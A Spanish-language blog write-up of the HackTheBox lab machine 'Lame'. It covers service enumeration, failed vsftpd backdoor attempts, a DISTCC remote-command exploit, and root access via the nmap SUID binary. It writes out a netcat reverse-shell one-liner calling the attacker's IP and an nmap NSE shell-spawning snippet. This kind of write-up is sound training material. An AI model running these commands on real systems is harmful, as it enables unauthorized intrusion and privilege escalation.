---
layout: single
title: Lame (HackTheBox) - WriteUp (by blu3ming)
excerpt: "Writeup de la máquina Lame de la plataforma HackTheBpx. Nota: Puede incluir fallos y rabbit holes, los cuales se especifican, con el objetivo de que el lector no cometa los mismos errores que yo. Se recomienda leer el artículo completo antes de seguirlo al pie de la letra."
date: 2021-05-30
classes: wide
header:
  teaser: /assets/images/lame-writeup/lame.webp
  teaser_home_page: true
categories:
  - Writeup
tags:
  - HackTheBox
  - Writeup
  - Guia
---

[https://www.hackthebox.eu/home/machines/profile/1](https://www.hackthebox.eu/home/machines/profile/1)

+ Verificamos con una traza ICMP el sistema operativo al que nos enfrentamos. Vemos que es una máquina Linux (TTL aprox. de 64).

	![1]
	
+ Si realizamos un escaneo con ayuda de nmap, veremos que en el servidor se encuentran habilitados cinco servicios: un FTP, un SSH, un SMB y un DISTCC (este último se emplea en el cómputo distribuido).
  
    ``nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.3 -oG allPorts``
	
	![2]

+ Si realizamos un escaneo con ayuda de scripts básicos de enumeración, veremos que el servicio FTP corre con ayuda de un vsftpd versión 2.3.4.

    ![3]
	
	![4]
    
+ Como nos reportó el análisis anterior, el servicio FTP también acepta logueo de usuario anónimo, por lo que intentamos entrar con estas credenciales. Vemos que nos lo permite, sin embargo, la carpeta de dicho servicio se encuentra vacía.

    ![5]
    
+ Si intentamos ahora listar los recursos compartidos del servicio SMB, veremos que hay dos carpetas: **tmp** y **opt**.

	``smbclient -L 10.10.10.3 -N``

    ![6]
    
	Si entramos con una Null Session al servicio, y listamos los archivos contenidos dentro de el primer recurso compartido encontrado, el cual es **tmp**, veremos un par de ficheros.
    
    ![7]
    
	Si intentamos acceder al segundo recurso compartido que encontramos, veremos que no tenemos acceso a este por medio de la null session.

    ![8]
    
	Dada esta situación, solamente nos enfocamos en los ficheros encontrados en el recurso compartido al que obtuvimos acceso. Por desgracia, su contenido no nos resulta de utilidad.

    ![9]
	
	Nada relevante por aquí.
    
+ Nuestro siguiente objetivo es ver si la versión y servicio FTP cuentan con alguna vulnerabilidad conocida. Vemos que sí, se trata de un backdoor que nos permite ejecución remota de comandos.
    
    ![10]
    
	Por desgracia, cuando intentamos correr este exploit, veremos que no funciona. El objetivo de este es obtener una reverse shell.

    ![11]
    
+ Buscamos ahora otro exploit que nos permita explotar la misma vulnerabilidad, y en nuestra búsqueda nos encontramos con un script en Github.
    
    ![12]
    
	Por desgracia, este script tampoco funcionó, por lo que se deduce que la vulnerabilidad debe estar parchada de alguna forma en el servidor remoto.

+ Nos enfocamos ahora en el siguiente servicio encontrado en el puerto 3632, el cual es DISTCC. Vemos que este cuenta con una vulnerabilidad reportada, por lo que buscamos el exploit para vulnerar la máquina.

    ![13]
    
	De igual manera, esta vulnerabilidad nos permite ejecución remota de comandos en el servidor, solo es necesario pasarle como parámetro el comando a ejecuta. Como podemos ver, el servidor responde ante una ejecución whoami.

    ![14]
    
+ Dado que hay una respuesta positiva para esta ejecución de comandos, ahora intentamos entablarnos una reverse shell a nuestro equipo.

	``python exploit.py -t 10.10.10.3 -p 3632 -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 443 >/tmp/f"``

    ![15]

    ![16]
	
	Vemos que el comando se ejecuta correctamente, ya que nuestra sesión de netcat recibe la conexión de parte del servidor.
    
+ Con esta sesión interactiva, ya podemos interactuar directamente con el servidor. Primero listamos la flag de usuario.

    ![17]
    
+ Nuestro siguiente objetivo es la escalada de privilegios. Primero, iniciamos por listar permisos SUID en el sistema. Vemos que el binario nmap tiene este permiso habilitado.
    
    ![18]
    
+ Si buscamos en GTFOBINS, veremos una forma de explotar dicho permiso. Por desgracia, no nos ayuda en la escalada de privilegios.

    ![19]
    
+ Si seguimos buscando en internet, veremos que podemos emplear este permiso para spawnear una shell como usuario administrador de la siguiente manera:
	
    ![20]
    
+ Ejecutamos los comandos tal y como nos son presentados, y como podemos observar, el binario nmap spawnea una bash como el usuario root.

	Básicamente lo que hace es crear un script personalizado de nmap en formato nse que, al ser llamado dentro del comando nmap, spawnea dicha bash. Se confirma con ayuda del comando whoami.
    
	```
	TF=$(mktemp)
	echo 'os.execute("/bin/sh")' > $TF
	/usr/bin/nmap localhost --script=$TF
	```
    
	![21]
    
+ Por último, únicamente nos resta listar la flag de usuario root. Con esto, hemos comprometido correctamente la máquina.

	![22]
	
+ **Nota:** Si en cuanto recibimos una shell interactiva por medio de netcat, realizamos un tratamiento de la TTY, podremos explotar el permiso SUID de nmap iniciando el modo interactivo de este. Una vez dentro, podemos escapar comandos con ayuda de “!”, por lo que solamente tenemos que llamar a una bash y listo, tendremos una sesión como el usuario root.

	![23]
    
[1]:/assets/images/lame-writeup/1.png
[2]:/assets/images/lame-writeup/2.png
[3]:/assets/images/lame-writeup/3.png
[4]:/assets/images/lame-writeup/4.png
[5]:/assets/images/lame-writeup/5.png
[6]:/assets/images/lame-writeup/6.png
[7]:/assets/images/lame-writeup/7.png
[8]:/assets/images/lame-writeup/8.png
[9]:/assets/images/lame-writeup/9.png
[10]:/assets/images/lame-writeup/10.png
[11]:/assets/images/lame-writeup/11.png
[12]:/assets/images/lame-writeup/12.png
[13]:/assets/images/lame-writeup/13.png
[14]:/assets/images/lame-writeup/14.png
[15]:/assets/images/lame-writeup/15.png
[16]:/assets/images/lame-writeup/16.png
[17]:/assets/images/lame-writeup/17.png
[18]:/assets/images/lame-writeup/18.png
[19]:/assets/images/lame-writeup/19.png
[20]:/assets/images/lame-writeup/20.png
[21]:/assets/images/lame-writeup/21.png
[22]:/assets/images/lame-writeup/22.png
[23]:/assets/images/lame-writeup/23.png